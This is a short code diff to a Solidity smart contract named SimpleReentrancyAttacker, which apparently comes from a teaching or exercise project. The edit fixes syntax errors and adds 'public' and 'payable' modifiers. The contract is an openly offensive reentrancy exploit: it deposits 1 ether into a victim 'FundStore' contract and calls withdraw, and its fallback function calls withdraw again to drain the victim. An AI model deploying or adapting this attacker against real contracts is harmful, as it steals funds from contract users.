@@ -8,14 +8,14 @@ contract SimpleReentrancyAttacker{
 
     FundStore victimContract;
 
-    function fallback(){
+    function fallback() public{
         victimContract.withdraw(1 ether);
     }
 
-    function attack(address _contractToBeAttacked){
-        require(msg.value >= 1 ether, "NOTEBAL);
+    function attack(address _contractToBeAttacked) public payable {
+        require(msg.value >= 1 ether, "NOTEBAL");
         victimContract = FundStore(_contractToBeAttacked);
-        require(balances(_contractToBeAttacked > 0));
+        require(address(_contractToBeAttacked).balance > 0);
         victimContract.deposit{value: 1 ether}();
         victimContract.withdraw(1 ether);
     }
